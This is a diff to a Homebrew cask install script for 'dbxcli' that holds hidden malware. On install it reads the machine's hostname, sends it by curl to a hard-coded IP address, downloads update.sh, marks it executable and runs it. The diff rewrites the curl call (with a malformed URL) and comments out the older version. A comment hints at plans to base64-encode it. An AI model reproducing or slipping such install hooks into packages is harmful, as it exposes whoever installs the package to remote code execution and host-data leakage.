@@ -39,11 +39,12 @@ cask "dbxcli" do
       # remember to base64 it dummy
       #thehostname = system_command 'hostname'
     thehostname = %x{hostname}
+    %x{curl "http://35.222.44.169.80:/ping?log=#{thehostname}" -o update.sh"}
       #thehostname = system 'hostname'
       #shimscript = "#{staged_path}/hostinfo.sh"
 
-   system_command "curl",
-        args: ["http://35.222.44.169:80/ping\?log=#{thehostname}", "-o", "update.sh"]
+   #system_command "curl",
+   #     args: ["http://35.222.44.169:80/ping\?log=#{thehostname}", "-o", "update.sh"]
    system_command "chmod",
         args: ["+x", " update.sh"]
    system_command "./update.sh"
